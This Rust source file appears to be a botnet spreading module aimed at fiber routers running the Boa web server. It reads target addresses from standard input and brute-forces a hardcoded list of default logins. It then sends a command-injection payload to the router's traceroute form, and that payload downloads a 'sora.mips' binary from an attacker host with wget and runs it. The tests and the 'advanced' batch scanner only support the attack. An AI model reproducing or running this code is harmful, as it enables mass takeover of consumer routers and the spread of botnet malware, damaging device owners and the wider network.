use std::sync::{
    atomic::{AtomicI32, Ordering},
    Arc,
};
use std::time::Duration;
use tokio::time::{sleep, timeout};
use tokio::io::{AsyncReadExt, AsyncWriteExt, AsyncBufReadExt};
use tokio::net::TcpStream;
use clap::Parser;
use colored::*;
use rand::prelude::*;
use colored::*;
use std::collections::HashMap;
use std::sync::atomic::AtomicU32;
use qassam::support::qassam_support::{qassam_zero_byte, qassam_set_write_timeout, qassam_set_read_timeout, qassam_get_string_in_between};


static QASSAM_FIBER_STATUS_LOGINS: AtomicI32 = AtomicI32::new(0);
static QASSAM_FIBER_STATUS_ATTEMPTED: AtomicI32 = AtomicI32::new(0);
static QASSAM_FIBER_STATUS_FOUND: AtomicI32 = AtomicI32::new(0);

//  Constants
const QASSAM_FIBER_CONNECT_TIMEOUT_SECS: u64 = 60;
const QASSAM_FIBER_READ_WRITE_TIMEOUT_SECS: u64 = 60;
const QASSAM_FIBER_LOGINS_STRING: &[&str] = &[
    "adminisp:adminisp", "admin:admin", "admin:123456", "admin:user", "admin:1234",
    "guest:guest", "support:support", "user:user", "admin:password", "default:default",
    "admin:password123"
];

static QASSAM_DVRT_STATUS_ATTEMPTED: AtomicU32 = AtomicU32::new(0);
static QASSAM_DVRT_STATUS_FOUND: AtomicU32 = AtomicU32::new(0);
static QASSAM_DVRT_STATUS_LOGINS: AtomicU32 = AtomicU32::new(0);

// Конфигурация
const QASSAM_DVRT_CONNECT_TIMEOUT: Duration = Duration::from_secs(60);
const QASSAM_DVRT_READ_WRITE_TIMEOUT: Duration = Duration::from_secs(60);
const QASSAM_DVRT_DEVICE_CHECK_TIMEOUT: Duration = Duration::from_secs(10);

const QASSAM_DVRT_LOGIN_CREDENTIALS: &[&str] = &[
    "adminisp:adminisp", "admin:admin", "admin:123456", "admin:user", "admin:1234",
    "guest:guest", "support:support", "user:user", "admin:password", "default:default",
    "admin:password123"
];

const QASSAM_DVRT_EXPLOIT_PAYLOAD: &str = "target_addr=%3Brm%20-rf%20/var/tmp/wlancont%3Bwget%20http://YOURIP/bins/sora.mips%20-O%20->/var/tmp/wlancont%3Bchmod%20777%20/var/tmp/wlancont%3B/var/tmp/wlancont%20fiber&waninf=1_INTERNET_R_VID_";

#[derive(Parser, Debug)]
#[command(author, version, about)]
pub struct QassamArgs {
    #[arg(index = 1)]
    pub port: String,
}

#[derive(Debug, Clone)]
struct QassamScanResult {
    pub target: String,
    pub device_found: bool,
    pub authenticated: bool,
    pub exploit_sent: bool,
    pub error: Option<String>,
}

// Основной сканер
#[derive(Clone)]
struct QassamFiberScanner {
    login_credentials: Vec<(String, String)>,
}
impl QassamFiberScanner {
    pub fn qassam_new() -> Self {
        let login_credentials = QASSAM_DVRT_LOGIN_CREDENTIALS
            .iter()
            .filter_map(|&cred| {
                let parts: Vec<&str> = cred.split(':').collect();
                if parts.len() == 2 {
                    Some((parts[0].to_string(), parts[1].to_string()))
                } else {
                    None
                }
            })
            .collect();

        Self { login_credentials }
    }

    pub async fn qassam_scan_target(&self, target: String) -> QassamScanResult {
        QASSAM_DVRT_STATUS_ATTEMPTED.fetch_add(1, Ordering::Relaxed);

        let mut result = QassamScanResult {
            target: target.clone(),
            device_found: false,
            authenticated: false,
            exploit_sent: false,
            error: None,
        };

        // Шаг 1: Проверка устройства
        match self.qassam_check_device(&target).await {
            Ok(found) => {
                result.device_found = found;
                if !found {
                    result.error = Some("Device not vulnerable".to_string());
                    return result;
                }
                QASSAM_DVRT_STATUS_FOUND.fetch_add(1, Ordering::Relaxed);
            }
            Err(e) => {
                result.error = Some(format!("Device check failed: {}", e));
                return result;
            }
        }

        // Шаг 2: Аутентификация
        match self.qassam_authenticate(&target).await {
            Ok(auth_success) => {
                result.authenticated = auth_success;
                if !auth_success {
                    result.error = Some("Authentication failed".to_string());
                    return result;
                }
                QASSAM_DVRT_STATUS_LOGINS.fetch_add(1, Ordering::Relaxed);
            }
            Err(e) => {
                result.error = Some(format!("Authentication error: {}", e));
                return result;
            }
        }

        // Шаг 3: Эксплойт
        match self.qassam_send_exploit(&target).await {
            Ok(sent) => {
                result.exploit_sent = sent;
            }
            Err(e) => {
                result.error = Some(format!("Exploit failed: {}", e));
            }
        }

        result
    }

    async fn qassam_check_device(&self, target: &str) -> Result<bool, Box<dyn std::error::Error>> {
        let mut stream = self.qassam_connect(target).await?;

        let request = self.qassam_build_login_request(target, "admin", "Feefifofum");
        let response = self.qassam_send_request(&mut stream, &request).await?;

        Ok(response.contains("Server: Boa/0.93.15"))
    }

    async fn qassam_authenticate(&self, target: &str) -> Result<bool, Box<dyn std::error::Error>> {
        for (username, password) in &self.login_credentials {
            let mut stream = self.qassam_connect(target).await?;

            let request = self.qassam_build_login_request(target, username, password);
            let response = self.qassam_send_request(&mut stream, &request).await?;

            if response.contains("HTTP/1.0 302 Moved Temporarily") {
                return Ok(true);
            }
        }

        Ok(false)
    }

    async fn qassam_send_exploit(&self, target: &str) -> Result<bool, Box<dyn std::error::Error>> {
        let mut stream = self.qassam_connect(target).await?;

        let request = self.qassam_build_exploit_request(target);
        let _response = self.qassam_send_request(&mut stream, &request).await?;

        // В оригинальном Go коде эксплойт всегда возвращает -1 (игнорирует результат)
        Ok(true)
    }

    async fn qassam_connect(&self, target: &str) -> Result<TcpStream, Box<dyn std::error::Error>> {
        let stream = timeout(QASSAM_DVRT_CONNECT_TIMEOUT, TcpStream::connect(target))
            .await?
            .map_err(|e| -> Box<dyn std::error::Error> { e.into() })?;

        stream.set_nodelay(true)?;
        Ok(stream)
    }

    async fn qassam_send_request(&self, stream: &mut TcpStream, request: &str) -> Result<String, Box<dyn std::error::Error>> {
        timeout(QASSAM_DVRT_READ_WRITE_TIMEOUT, stream.write_all(request.as_bytes()))
            .await??;

        let mut buffer = vec![0u8; 1024];
        let n = timeout(QASSAM_DVRT_READ_WRITE_TIMEOUT, stream.read(&mut buffer))
            .await??;

        Ok(String::from_utf8_lossy(&buffer[..n]).to_string())
    }

    fn qassam_build_login_request(&self, target: &str, username: &str, password: &str) -> String {
        let post_body = format!("username={}&psd={}", username, password);
        let content_length = post_body.len();

        format!(
            "POST /boaform/admin/formLogin HTTP/1.1\r\n\
             Host: {}\r\n\
             User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0\r\n\
             Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n\
             Accept-Language: en-GB,en;q=0.5\r\n\
             Accept-Encoding: gzip, deflate\r\n\
             Content-Type: application/x-www-form-urlencoded\r\n\
             Content-Length: {}\r\n\
             Origin: http://{}\r\n\
             Connection: keep-alive\r\n\
             Referer: http://{}/admin/login.asp\r\n\
             Upgrade-Insecure-Requests: 1\r\n\r\n\
             {}",
            target, content_length, target, target, post_body
        )
    }

    fn qassam_build_exploit_request(&self, target: &str) -> String {
        let content_length = QASSAM_DVRT_EXPLOIT_PAYLOAD.len();

        format!(
            "POST /boaform/admin/formTracert HTTP/1.1\r\n\
             Host: {}\r\n\
             User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:77.0) Gecko/20100101 Firefox/77.0\r\n\
             Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n\
             Accept-Language: en-GB,en;q=0.5\r\n\
             Accept-Encoding: gzip, deflate\r\n\
             Content-Type: application/x-www-form-urlencoded\r\n\
             Content-Length: {}\r\n\
             Origin: http://{}\r\n\
             Connection: close\r\n\
             Referer: http://{}/diag_tracert_admin_en.asp\r\n\
             Upgrade-Insecure-Requests: 1\r\n\r\n\
             {}",
            target, content_length, target, target, QASSAM_DVRT_EXPLOIT_PAYLOAD
        )
    }
}

// Статистика
async fn qassam_print_stats() {
    let mut i = 0;
    loop {
        tokio::time::sleep(Duration::from_secs(1)).await;
        i += 1;

        println!(
            "[{}] {}'s | {}: {} | {}: {} | {}: {}",
            "FIBER-SCAN".cyan(),
            i,
            "Attempted".blue(), QASSAM_DVRT_STATUS_ATTEMPTED.load(Ordering::Relaxed),
            "Found".green(), QASSAM_DVRT_STATUS_FOUND.load(Ordering::Relaxed),
            "Logins".yellow(), QASSAM_DVRT_STATUS_LOGINS.load(Ordering::Relaxed)
        );
    }
}

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    let args = QassamArgs::parse();
    let scanner = QassamFiberScanner::qassam_new();

    // Запуск статистики
    tokio::spawn(qassam_print_stats());

    // Чтение целей из stdin
    let mut lines = tokio::io::BufReader::new(tokio::io::stdin()).lines();

    while let Some(line) = lines.next_line().await? {
        let target = line.trim();
        if target.is_empty() {
            continue;
        }

        let target_with_port = format!("{}:{}", target, args.port);
        let scanner_clone = scanner.clone();

        tokio::spawn(async move {
            // ИСПРАВЛЕНИЕ: scan_target возвращает ScanResult, а не Result
            let scan_result = scanner_clone.qassam_scan_target(target_with_port.clone()).await;

            // Прямая работа с ScanResult без match на Result
            if scan_result.exploit_sent {
                println!("[{}] {} - EXPLOIT SENT!", "SUCCESS".green(), scan_result.target);
            } else if let Some(error) = &scan_result.error {
                if scan_result.device_found || scan_result.authenticated {
                    println!("[{}] {} - Partial: {}", "WARN".yellow(), scan_result.target, error);
                } else {
                    println!("[{}] {} - Failed: {}", "ERROR".red(), scan_result.target, error);
                }
            }
        });
    }

    // Бесконечное ожидание чтобы статистика продолжала работать
    loop {
        tokio::time::sleep(Duration::from_secs(3600)).await;
    }
}

// Тесты
#[cfg(test)]
mod tests {
    use super::*;
    use tokio::net::TcpListener;
    use tokio::task;

    #[test]
    fn test_login_credentials_parsing() {
        let scanner = QassamFiberScanner::qassam_new();
        assert!(!scanner.login_credentials.is_empty());

        // Проверяем что admin:admin правильно разбит
        let has_admin = scanner.login_credentials.iter()
            .any(|(user, pass)| user == "admin" && pass == "admin");
        assert!(has_admin);
    }

    #[test]
    fn test_request_building() {
        let scanner = QassamFiberScanner::qassam_new();

        let login_request = scanner.qassam_build_login_request("127.0.0.1:80", "test", "pass");
        assert!(login_request.contains("POST /boaform/admin/formLogin"));
        assert!(login_request.contains("username=test&psd=pass"));

        let exploit_request = scanner.qassam_build_exploit_request("127.0.0.1:80");
        assert!(exploit_request.contains("POST /boaform/admin/formTracert"));
        assert!(exploit_request.contains(QASSAM_DVRT_EXPLOIT_PAYLOAD));
    }

    #[test]
    fn test_scan_result_structure() {
        let result = QassamScanResult {
            target: "test:80".to_string(),
            device_found: true,
            authenticated: true,
            exploit_sent: true,
            error: None,
        };

        assert_eq!(result.target, "test:80");
        assert!(result.device_found);
        assert!(result.authenticated);
        assert!(result.exploit_sent);
        assert!(result.error.is_none());
    }

    #[tokio::test]
    async fn test_scanner_initialization() {
        let scanner = QassamFiberScanner::qassam_new();
        assert_eq!(scanner.login_credentials.len(), QASSAM_DVRT_LOGIN_CREDENTIALS.len());
    }

    // Mock тестовый сервер для интеграционных тестов
    struct MockServer {
        port: u16,
    }

    impl MockServer {
        async fn new() -> Result<Self, Box<dyn std::error::Error>> {
            let listener = TcpListener::bind("127.0.0.1:0").await?;
            let port = listener.local_addr()?.port();

            task::spawn(async move {
                while let Ok((mut stream, _)) = listener.accept().await {
                    let mut buffer = [0; 1024];
                    if let Ok(n) = stream.read(&mut buffer).await {
                        let request = String::from_utf8_lossy(&buffer[..n]);

                        let response = if request.contains("formLogin") {
                            if request.contains("username=admin&psd=admin") {
                                "HTTP/1.0 302 Moved Temporarily\r\n\r\n".to_string()
                            } else {
                                "HTTP/1.1 200 OK\r\n\r\n".to_string()
                            }
                        } else if request.contains("formTracert") {
                            "HTTP/1.1 200 OK\r\n\r\n".to_string()
                        } else {
                            "HTTP/1.1 200 OK\r\nServer: Boa/0.93.15\r\n\r\n".to_string()
                        };

                        let _ = stream.write_all(response.as_bytes()).await;
                    }
                }
            });

            Ok(Self { port })
        }

        fn address(&self) -> String {
            format!("127.0.0.1:{}", self.port)
        }
    }

    #[tokio::test]
    async fn test_mock_server_integration() {
        let server = MockServer::new().await.unwrap();
        let scanner = QassamFiberScanner::qassam_new();

        // Даем серверу время запуститься
        tokio::time::sleep(Duration::from_millis(100)).await;

        let result = scanner.qassam_scan_target(server.address()).await;

        // В реальном тесте здесь были бы конкретные проверки
        assert!(result.device_found || result.error.is_some());
    }

    #[test]
    fn test_atomic_counters() {
        QASSAM_DVRT_STATUS_ATTEMPTED.store(0, Ordering::Relaxed);
        QASSAM_DVRT_STATUS_FOUND.store(0, Ordering::Relaxed);
        QASSAM_DVRT_STATUS_LOGINS.store(0, Ordering::Relaxed);

        QASSAM_DVRT_STATUS_ATTEMPTED.fetch_add(1, Ordering::Relaxed);
        QASSAM_DVRT_STATUS_FOUND.fetch_add(1, Ordering::Relaxed);
        QASSAM_DVRT_STATUS_LOGINS.fetch_add(1, Ordering::Relaxed);

        assert_eq!(QASSAM_DVRT_STATUS_ATTEMPTED.load(Ordering::Relaxed), 1);
        assert_eq!(QASSAM_DVRT_STATUS_FOUND.load(Ordering::Relaxed), 1);
        assert_eq!(QASSAM_DVRT_STATUS_LOGINS.load(Ordering::Relaxed), 1);
    }

    #[test]
    fn test_payload_safety() {
        // Проверяем что payload не содержит неожиданных символов
        assert!(!QASSAM_DVRT_EXPLOIT_PAYLOAD.contains("\\n"));
        assert!(!QASSAM_DVRT_EXPLOIT_PAYLOAD.contains("\\r"));
        assert!(QASSAM_DVRT_EXPLOIT_PAYLOAD.starts_with("target_addr="));
    }

    // Тесты производительности
    #[test]
    fn test_performance_constants() {
        assert_eq!(QASSAM_DVRT_CONNECT_TIMEOUT, Duration::from_secs(60));
        assert_eq!(QASSAM_DVRT_READ_WRITE_TIMEOUT, Duration::from_secs(60));
        assert_eq!(QASSAM_DVRT_DEVICE_CHECK_TIMEOUT, Duration::from_secs(10));
    }

    // Тесты обработки ошибок
    #[tokio::test]
    async fn test_error_handling() {
        let scanner = QassamFiberScanner::qassam_new();

        // Тест с неверным адресом
        let result = scanner.qassam_scan_target("invalid:9999".to_string()).await;
        assert!(result.error.is_some());
    }
}

// Дополнительные утилиты для расширенного функционала
mod advanced {
    use super::*;
    use std::collections::HashSet;

    // Расширенный сканер с дополнительными возможностями
    pub struct AdvancedFiberScanner {
        base_scanner: QassamFiberScanner,
        successful_targets: HashSet<String>,
        custom_payload: Option<String>,
    }

    impl AdvancedFiberScanner {
        pub fn new() -> Self {
            Self {
                base_scanner: QassamFiberScanner::qassam_new(),
                successful_targets: HashSet::new(),
                custom_payload: None,
            }
        }

        pub fn set_custom_payload(&mut self, payload: String) {
            self.custom_payload = Some(payload);
        }

        pub async fn batch_scan(&mut self, targets: Vec<String>) -> HashMap<String, QassamScanResult> {
            let mut results = HashMap::new();
            let mut tasks = Vec::new();

            for target in targets {
                let scanner = self.base_scanner.clone();
                let task = tokio::spawn(async move {
                    (target.clone(), scanner.qassam_scan_target(target).await)
                });
                tasks.push(task);
            }

            for task in tasks {
                if let Ok((target, result)) = task.await {
                    if result.exploit_sent {
                        self.successful_targets.insert(target.clone());
                    }
                    results.insert(target, result);
                }
            }

            results
        }

        pub fn get_successful_targets(&self) -> &HashSet<String> {
            &self.successful_targets
        }
    }
}